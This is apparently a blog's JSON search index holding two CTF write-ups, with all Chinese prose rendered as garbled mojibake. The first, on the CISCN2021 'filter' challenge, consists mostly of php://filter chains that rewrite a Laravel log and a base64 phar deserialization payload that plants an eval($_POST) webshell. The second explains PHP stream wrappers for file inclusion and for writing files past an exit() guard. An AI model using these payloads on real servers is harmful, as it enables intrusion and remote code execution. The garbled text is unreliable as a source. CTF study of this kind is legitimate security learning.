{"meta":{"title":"æœˆå‡ºä»äº‘","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"CTF","date":"2020-11-17T05:49:23.000Z","updated":"2020-11-17T06:11:45.482Z","comments":true,"path":"categories/index-1.html","permalink":"http://example.com/categories/index-1.html","excerpt":"","text":""},{"title":"å¼€å‘","date":"2020-11-17T06:11:43.000Z","updated":"2020-11-17T06:12:00.335Z","comments":true,"path":"categories/index-2.html","permalink":"http://example.com/categories/index-2.html","excerpt":"","text":""},{"title":"æ¸—é€","date":"2020-11-17T06:12:08.000Z","updated":"2020-11-17T06:12:21.520Z","comments":true,"path":"categories/index-3.html","permalink":"http://example.com/categories/index-3.html","excerpt":"","text":""},{"title":"search","date":"2020-11-17T06:21:26.000Z","updated":"2020-11-17T06:21:42.054Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""},{"title":"AWD","date":"2014-12-22T04:39:04.000Z","updated":"2020-11-17T06:14:07.642Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"AWD","date":"2020-11-17T06:07:49.000Z","updated":"2020-11-17T06:08:03.116Z","comments":true,"path":"tags/AWD.html","permalink":"http://example.com/tags/AWD.html","excerpt":"","text":""},{"title":"BUU","date":"2020-11-17T06:04:40.000Z","updated":"2020-11-19T12:53:08.536Z","comments":true,"path":"tags/BUU.html","permalink":"http://example.com/tags/BUU.html","excerpt":"","text":""},{"title":"Java","date":"2020-11-17T06:07:36.000Z","updated":"2020-11-17T06:16:38.291Z","comments":true,"path":"tags/Java.html","permalink":"http://example.com/tags/Java.html","excerpt":"","text":""},{"title":"nodejs","date":"2020-11-17T06:18:56.000Z","updated":"2020-11-17T06:19:16.847Z","comments":true,"path":"tags/nodejs.html","permalink":"http://example.com/tags/nodejs.html","excerpt":"","text":""},{"title":"SQLæ³¨å…¥","date":"2020-11-17T06:07:24.000Z","updated":"2020-11-17T06:16:34.701Z","comments":true,"path":"tags/SQLæ³¨å…¥.html","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5.html","excerpt":"","text":""},{"title":"php","date":"2020-11-17T06:18:09.000Z","updated":"2020-11-17T06:18:40.651Z","comments":true,"path":"tags/php.html","permalink":"http://example.com/tags/php.html","excerpt":"","text":""},{"title":"ssti","date":"2020-11-17T06:06:49.000Z","updated":"2020-11-19T12:52:47.959Z","comments":true,"path":"tags/ssti.html","permalink":"http://example.com/tags/ssti.html","excerpt":"","text":""},{"title":"ååºåˆ—åŒ–","date":"2020-11-17T06:18:43.000Z","updated":"2020-11-17T06:18:51.497Z","comments":true,"path":"tags/ååºåˆ—åŒ–.html","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html","excerpt":"","text":""},{"title":"æ¯”èµ›","date":"2020-11-17T06:07:10.000Z","updated":"2020-11-17T06:16:31.708Z","comments":true,"path":"tags/æ¯”èµ›.html","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B.html","excerpt":"","text":""},{"title":"æ¸—é€","date":"2020-11-17T06:09:45.000Z","updated":"2020-11-17T06:16:44.308Z","comments":true,"path":"tags/æ¸—é€.html","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F.html","excerpt":"","text":""}],"posts":[{"title":"CISCN2021filter","slug":"CISCN2021filter","date":"2021-05-17T07:52:32.000Z","updated":"2021-05-17T10:30:07.703Z","comments":true,"path":"2021/05/17/CISCN2021filter/","link":"","permalink":"http://example.com/2021/05/17/CISCN2021filter/","excerpt":"","text":"çŸ¥è¯†ç‚¹ï¼š laravel8 debugçš„å¤ç° php filteræµçš„æ“ä½œ æ€è·¯guokeå¸ˆå‚…å¤ªå¼ºäº†ã€‚ã€‚ è·Ÿè¿™é“é¢˜ä¸€ä¸ªæ€è·¯ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;264662.html æ¸…ç©ºlogæ—¥å¿—ï¼š 1php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log 123456php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.logphp://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.logphp://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log 1R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoLAgAAAQAAABEAAAABAAAAAADVAQAATzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjUyOiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCI8P3BocCBldmFsKFwkX1BPU1RbMF0pOyIpIjt9aToxO3M6MzoicnVuIjt9fX19fQcAAABleHAudHh0BAAAAKQtomAEAAAADH5/2LYBAAAAAAAA1XRlc3QXPuUMZZWd7xu6NTqDs7yrehohlQIAAABHQk1C 1=52=00=30=00=6C=00=47=00=4F=00=44=00=6C=00=68=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=78=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=38=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=79=00=4D=00=7A=00=6F=00=69=00=65=00=57=00=6C=00=70=00=58=00=47=00=52=00=69=00=58=00=45=00=4A=00=68=00=64=00=47=00=4E=00=6F=00=55=00=58=00=56=00=6C=00=63=00=6E=00=6C=00=53=00=5A=00=58=00=4E=00=31=00=62=00=48=00=51=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=7A=00=59=00=36=00=49=00=67=00=42=00=35=00=61=00=57=00=6C=00=63=00=5A=00=47=00=4A=00=63=00=51=00=6D=00=46=00=30=00=59=00=32=00=68=00=52=00=64=00=57=00=56=00=79=00=65=00=56=00=4A=00=6C=00=63=00=33=00=56=00=73=00=64=00=41=00=42=00=66=00=5A=00=47=00=46=00=30=00=59=00=56=00=4A=00=6C=00=59=00=57=00=52=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=78=00=4E=00=54=00=6F=00=69=00=52=00=6D=00=46=00=72=00=5A=00=58=00=4A=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6D=00=62=00=33=00=4A=00=74=00=59=00=58=00=52=00=30=00=5A=00=58=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=59=00=32=00=78=00=76=00=63=00=32=00=55=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=45=00=36=00=49=00=6E=00=6C=00=70=00=61=00=56=00=78=00=79=00=5A=00=58=00=4E=00=30=00=58=00=45=00=4E=00=79=00=5A=00=57=00=46=00=30=00=5A=00=55=00=46=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=54=00=6F=00=69=00=59=00=32=00=68=00=6C=00=59=00=32=00=74=00=42=00=59=00=32=00=4E=00=6C=00=63=00=33=00=4D=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=78=00=7A=00=49=00=6A=00=74=00=39=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=7A=00=6F=00=69=00=63=00=6E=00=56=00=75=00=49=00=6A=00=74=00=39=00=66=00=58=00=31=00=39=00=42=00=77=00=41=00=41=00=41=00=47=00=56=00=34=00=63=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=2B=00=6A=00=43=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=74=00=67=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=33=00=75=00=62=00=38=00=6B=00=63=00=42=00=71=00=45=00=34=00=48=00=53=00=4F=00=45=00=65=00=6C=00=4C=00=62=00=66=00=71=00=6E=00=55=00=55=00=76=00=6E=00=41=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a 1phar://../runtime/log/app.log ã€‚ 7.4ç‰ˆæœ¬æŠŠassertban äº†ï¼Œä¸çŸ¥é“å’‹ç©äº†ï¼Œ","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"å…³äºPHPä¼ªåè®®çš„è¯»å†™","slug":"å…³äºPHPä¼ªåè®®çš„è¯»å†™","date":"2021-05-16T07:33:26.000Z","updated":"2021-05-17T04:19:25.637Z","comments":true,"path":"2021/05/16/å…³äºPHPä¼ªåè®®çš„è¯»å†™/","link":"","permalink":"http://example.com/2021/05/16/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/","excerpt":"","text":"èµ·å› åœ¨BUUçš„ğŸåŸæ¯åˆ·é¢˜çš„æ—¶å€™é‡è§çš„é‚£ä¸ªeasyserï¼Œæ‰€ä»¥è®°å½•ä¸€äº›ï¼Œä½†æ˜¯æˆ‘çœŸæƒ³è¯´è¿™é¢˜ç›®çœŸå¼±æ™ºå•Š ç„¶åå°±é‡è§ä¸€ä¸ªä¼ªåè®®çš„è¯»å†™ï¼Œå…¶å®è¿™ä¸ªå·²ç»é‡è§è¿‡å¾ˆå¤šæ¬¡äº†ï¼Œè¿™æ¬¡ä¸»è¦æ˜¯å†™åœ¨hexoä¸Šï¼Œè¯´ä¸å®šä»¥åçº¿ä¸‹æ¯”èµ›ä¼šé‡å¾—åˆ°å‘¢ï¼Ÿ è´´ä¸Šå®˜æ–¹çš„åœ°å€ï¼š 1https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php.php é¦–å…ˆæ€»ç»“è¯»ã€‚ è¯»é‡ç‚¹å°±æ˜¯php://filter æµã€‚ å®˜æ–¹çš„æ–‡ç« ä¸­æåˆ°çš„ä¸‰ä¸ªå¯ç”¨å‡½æ•°ï¼š 1234readflefile()file_put_contentsfile_get_contents å¸¸ç”¨çš„LFIï¼š 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D; åç§° æè¿° resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ` write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ` &lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ è¿™é‡Œæ ¹æ®å®˜æ–¹çš„å‚æ•°è§£è¯»ä¸€ä¸‹ã€‚ resource åè·Ÿè¦è¿‡æ»¤çš„æ•°æ®æµï¼Œä½†æ˜¯åœ¨CTFä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯æŒ‡å®šæ–‡ä»¶çš„ã€‚ read/write è¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¯ä»¥å¤šé€‰ è¿‡æ»¤å™¨ï¼Œè¿™å°±æ„å‘³ç€å¯ä»¥ç©å¾ˆå¤šéªšæ“ä½œ å®é™…ä¸Šæ„Ÿè§‰è¯»å¹¶æ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œåˆ©ç”¨ä¼ªåè®®æµè¯»æ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›æ–‡ä»¶ä¸­å¯èƒ½å­˜åœ¨äº†è¿‡æ»¤ï¼Œå¦‚ï¼š æ„é€ è¿™ä¹ˆä¸¤ä¸ªæ–‡ä»¶ï¼š 12345&lt;?phpexit();echo &quot;123&quot;; 123456&lt;?php$a = $_GET[0];if(isset($a))&#123; include ($a);&#125; åˆ©ç”¨ä¼ªåè®®æµè¿˜æ˜¯å¯ä»¥è¯»å–åˆ°çš„ ä½†å¦‚æœç›´æ¥è¯»å–å°±ä¼šå› ä¸ºè¢«è§£æäº†exitè¯­å¥è€Œæ— æ³•è¯»å–åˆ°åé¢çš„éƒ¨åˆ†ã€‚ å†™è¯»ä¸€èˆ¬ä¸ä½œä¸ºè€ƒç‚¹ï¼Œåªåšæ¥è¾…åŠ©ï¼Œå‰æ®µæ—¶é—´ï¼Œå‘ƒï¼Œ20å¹´çš„æ—¶å€™æˆ‘è®°å¾—å‡ ä¸ªæ¯”èµ›éƒ½å‡ºäº†åˆ©ç”¨phpä¼ªåè®®æµæ¥è¿›è¡Œå†™å…¥æ–‡ä»¶ é¦–å…ˆï¼Œæœ‰å¦‚ä¸‹å‡½æ•°å¯ä»¥åˆ©ç”¨åˆ°PHPçš„åè®®æµè¿›è¡Œå®æˆ˜æ“ä½œ COPY file_get_contents file_put_contents fopen (æˆ‘æµ‹è¯•çš„æ—¶å€™fwriteä¸å…è®¸åˆ©ç”¨ä¼ªåè®®æµæ¥å†™å…¥) readfile fopen: 123$handle = fopen(&#x27;php://filter/convert.base64-encode/resource=1.php&#x27;,&#x27;a&#x27;);fwrite($handle,&#x27;wuhuhu&#x27;); file_put_contents: 12345&lt;?php$a &#x3D; $_GET[0];$b &#x3D; $_GET[1];file_put_contents($b,$a); å¯ä»¥è¿™æ ·å†™å…¥ï¼š 1http:&#x2F;&#x2F;localhost&#x2F;5.php?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php&amp;0&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D; å¾—åˆ°ç»“æœï¼š é™¤æ­¤ä¹‹å¤–ï¼Œphpè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤æµçš„æ ¼å¼ï¼š 1234567&lt;?php/* è¿™ç®€å•ç­‰åŒäºï¼š readfile(&quot;http://www.example.com&quot;); å®é™…ä¸Šæ²¡æœ‰æŒ‡å®šè¿‡æ»¤å™¨ */readfile(&quot;php://filter/resource=http://www.example.com&quot;);?&gt; å…¶ä»–çš„å‡½æ•°ä¹Ÿæ˜¯å¤§åŒå°å¼‚çš„ã€‚ è¿‡æ»¤å™¨è¿‡æ»¤å™¨çš„urlï¼š 1https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php phpæä¾›çš„è¿‡æ»¤å™¨ï¼š å­—ç¬¦ä¸²è¿‡æ»¤å™¨string.rot13å®˜æ–¹çš„ä¾‹å­ï¼š 123456&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;string.rot13&#x27;);fwrite($fp, &quot;This is a test.\\n&quot;);/* Outputs: Guvf vf n grfg. */?&gt; æ–¹ä¾¿æµ‹è¯•å†™æˆï¼š 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;This is a test.\\n&quot;);/* Outputs: Guvf vf n grfg. */?&gt; å¯ä»¥å°±è¿™æ ·å†™ä½œï¼š 1http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;1.php è¿™æ ·å†™å…¥çš„æ–‡ä»¶å°±ä¼šè¢«ç”¨base64çš„æ–¹å¼åŠ å¯†ã€‚ string.toupperstring.toupperï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtoupper()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ å¤§å†™å†™å…¥çš„å†…å®¹ 1http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;1.php string.tolowerstring.tolowerï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® åŒæ ·ï¼Œå°å†™å†™å…¥çš„å†…å®¹ å®˜æ–¹å•ç‹¬åˆ—å‡ºæ¥çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼š string.strip_tags1234ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œ strip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚è­¦å‘Šæœ¬ç‰¹æ€§å·²è‡ª PHP 7.3.0 èµ·åºŸå¼ƒã€‚å¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨æœ¬ç‰¹æ€§ã€‚ ä¾‹å¦‚ï¼š 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;g1&gt;This&lt;h1&gt; is&lt;/h1&gt; a test.&lt;/g1&gt;\\n&quot;);/* This is a test */?&gt; å¾—åˆ°çš„ç»“æœæ˜¯æ‰€æœ‰çš„xmlçš„æ ‡ç­¾éƒ½è¢«åˆ æ‰äº†ã€‚å¦‚æœæ˜¯å°šæœªé—­åˆçš„æ ‡ç­¾ï¼ŒåŒæ ·çš„ä¼šå°†å…¶åˆ é™¤ 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;?php 123123123?&gt;\\n&quot;);/* Outputs: å…¨éƒ¨è¢«åˆ é™¤ */?&gt; ä½†æ˜¯å¦‚æœå°†fwriteæ„é€ ä¸ºï¼š 1fwrite($fp, &quot;&lt;?php 123123123?&gt; asdasdasdasd\\n&quot;); å¾—åˆ°çš„ç»“æœä¾¿ä¼šæ˜¯ã€‚ 1asdasdasdasd æ‰€ä»¥é¢˜ç›®å¦‚æœå…è®¸æˆ‘ä»¬æ§åˆ¶å†™å…¥å†…å®¹çš„è¯ï¼Œå°±å¯ä»¥å°è¯•é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œå°±å¯ä»¥åˆ é™¤æ‰é¢˜ç›®å¯ä»¥è®¾ç½®çš„ä»£ç äº†ã€‚ ä½†æ˜¯è¯¥æ ‡ç­¾åˆä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬å†™å…¥çš„å†…å®¹ä¹Ÿä¼šè¢«ä»–åˆ é™¤ 1fwrite($fp, &quot;&lt;?php 123123123?&gt; &lt;?php phpinfo(); \\n&quot;); å¥½åœ¨phpæ˜¯å…è®¸åŒæ—¶åˆ©ç”¨å¤šä¸ªåè®®æµçš„ã€‚å¹¶ä¸”PHPçš„åè®®æµé¡ºåºä¸ºï¼š ç”¨Aåè®®æµå¤„ç†ä¸€è¾¹æ–‡ä»¶ å†ç”¨Båè®®æµå¤„ç†ä¸€è¾¹æ–‡ä»¶ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„å†…å®¹ç»„åˆä¸º ?&gt; ç„¶ååœ¨base64è§£å¯†. 123456789http://localhost/5.php?0=php://filter/string.strip_tags|convert.base64-decode/resource=1.php&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;?php 123123123?&gt; Cjw/cGhwIHBocGluZm8oKTs=\\n&quot;);/* Outputs: Guvf vf n grfg. */?&gt; è½¬æ¢è¿‡æ»¤å™¨å®˜æ–¹è§£é‡Šï¼š å¦‚åŒ string.* è¿‡æ»¤å™¨ï¼Œconvert.* è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚å¯¹äºæŒ‡å®šè¿‡æ»¤å™¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒè¯¥å‡½æ•°çš„æ‰‹å†Œé¡µã€‚ convert.base64-encodeå’Œ convert.base64-decodeä½¿ç”¨è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ç­‰åŒäºåˆ†åˆ«ç”¨ base64_encode()å’Œ base64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ convert.base64-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚å¦‚æœç»™å‡ºäº† line-lengthï¼Œbase64 è¾“å‡ºå°†è¢«ç”¨ line-lengthä¸ªå­—ç¬¦ä¸º é•¿åº¦è€Œæˆªæˆå—ã€‚å¦‚æœç»™å‡ºäº† line-break-charsï¼Œæ¯å—å°†è¢«ç”¨ç»™å‡ºçš„å­—ç¬¦éš”å¼€ã€‚è¿™äº›å‚æ•°çš„æ•ˆæœå’Œç”¨ base64_encode()å†åŠ ä¸Š chunk_split()ç›¸åŒã€‚ convert.base64-encode/decodeè¿™ä¸ªå¤§å®¶éƒ½å¾ˆç†Ÿäº†å°±ä¸å¤šè¯´äº†ã€‚ convert.quoted-printable-encode &amp; convert.quoted-printable-decodeå®˜æ–¹çš„è§£é‡Šï¼š convert.quoted-printable-encodeå’Œ convert.quoted-printable-decodeä½¿ç”¨æ­¤è¿‡æ»¤å™¨çš„ decode ç‰ˆæœ¬ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚æ²¡æœ‰å’Œ convert.quoted-printable-encodeç›¸å¯¹åº”çš„å‡½æ•°ã€‚ convert.quoted-printable-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚é™¤äº†æ”¯æŒå’Œ convert.base64-encodeä¸€æ ·çš„é™„åŠ å‚æ•°å¤–ï¼Œ convert.quoted-printable-encodeè¿˜æ”¯æŒå¸ƒå°”å‚æ•° binaryå’Œ force-encode-firstã€‚ convert.base64-decodeåªæ”¯æŒ line-break-charså‚æ•°ä½œä¸ºä»ç¼–ç è½½è·ä¸­å‰¥ç¦»çš„ç±»å‹æç¤ºã€‚ æ„Ÿè§‰å¥½å¤æ‚ã€‚ã€‚ä½†æ˜¯ä¸»è¦æ˜¯ç¬¬äºŒè¡Œï¼Œç­‰ä»·äºquoted_printable_decodeå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œå°† quoted-printable å­—ç¬¦ä¸²è½¬æ¢ä¸º 8-bit å­—ç¬¦ä¸² 123456&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.quoted-printable-encode&#x27;);fwrite($fp, &quot;This is a test.\\n&quot;);/* Outputs: =This is a test.=0A */?&gt; æ¬¸ï¼Œè¿™å°±å¾ˆè¿·æƒ‘äº†ï¼Œå•¥å‡ æŠŠæ˜¯8-bit å­—ç¬¦ä¸²ï¼Ÿ å®˜æ–¹ä¸¢äº†ä¸ªurlç»™æˆ‘ï¼š 1http:&#x2F;&#x2F;www.faqs.org&#x2F;rfcs&#x2F;rfc2045.html æ¬¸ï¼Œè¿™å°±å¾ˆéš¾è¿‡äº†ï¼Œæˆ‘çœ‹ä¸æ‡‚è¯¥å’‹åŠå•Šï¼Ÿï¼Œä½†æ˜¯æ„Ÿè§‰å¯¹äºåšé¢˜æ¥è¯´æœ‰ç‚¹é¸¡è‚‹ï¼Œæš‚æ—¶å…ˆçŸ¥è¯†æ”¾åœ¨è¿™é‡Œï¼ˆå¸Œæœ›ä¸è¦å“ªå¤©åˆ«äººæ‚Ÿäº†å‡ºé¢˜åšä¸å‡ºæ¥æŒ¨æ‰“å‘œå‘œï¼‰ convert.iconv.*å‘ƒã€‚è¿™ä¸ªè¿‡æ»¤å™¨æ˜¯è¢«å®˜æ–¹è—èµ·æ¥äº†ï¼Œåªæœ‰è‹±æ–‡çš„åŸç‰ˆæ‰‹å†Œæ‰å¯ä»¥çœ‹è§ï¼ˆæ€ªä¸å¾—è§æœ‰é¢˜ç›®å‡ºè¿‡ï¼‰ è¯¥convert.iconv.*è¿‡æ»¤å™¨æ˜¯å¯ç”¨çš„ï¼Œå¦‚æœ çš„iconvæ”¯æŒå¯ç”¨ï¼Œå¹¶ä¸”å®ƒä»¬çš„ä½¿ç”¨æ˜¯ç­‰åŒäºå¤„ç†æ‰€æœ‰çš„æµæ•°æ®çš„iconvï¼ˆï¼‰ ã€‚è¿™äº›è¿‡æ»¤å™¨ä¸æ”¯æŒå‚æ•°ï¼Œè€Œæ˜¯æœŸæœ›è¾“å…¥å’Œè¾“å‡ºç¼–ç ä½œä¸ºè¿‡æ»¤å™¨åç§°çš„ä¸€éƒ¨åˆ†ç»™å‡ºï¼Œå³as convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;æˆ– convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; ï¼ˆè¿™ä¸¤ä¸ªç¬¦å·åœ¨è¯­ä¹‰ä¸Šæ˜¯ç­‰æ•ˆçš„ï¼‰ã€‚ ç”¨æ³•ï¼š 1234567&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.iconv.utf-16le.utf-8&#x27;);fwrite($fp, &quot;T\\0h\\0i\\0s\\0 \\0i\\0s\\0 \\0a\\0 \\0t\\0e\\0s\\0t\\0.\\0\\n\\0&quot;);fclose($fp);/* Outputs: This is a test. */?&gt; æ¬¸ï¼Œæœ‰è¿™ä¸ªå°±å¾ˆæ–¹ä¾¿ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†å°†å†…å®¹ä»A-&gt;è½¬æ¢åˆ°Bï¼Œè¿™æ ·çš„è¯å°±å¾ˆèˆ’æœï¼Œå› ä¸ºä»–ä¼šé€ æˆé¢˜ç›®è®¾ç½®çš„éšœç¢ä»£ç å¤±æ•ˆï¼Œæ¯”å¦‚æœ‰è¿™ç§æƒ…å†µï¼š 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;?php exit(); /* å¯æ§å†…å®¹ */ \\n&quot;);?&gt; æ„é€ 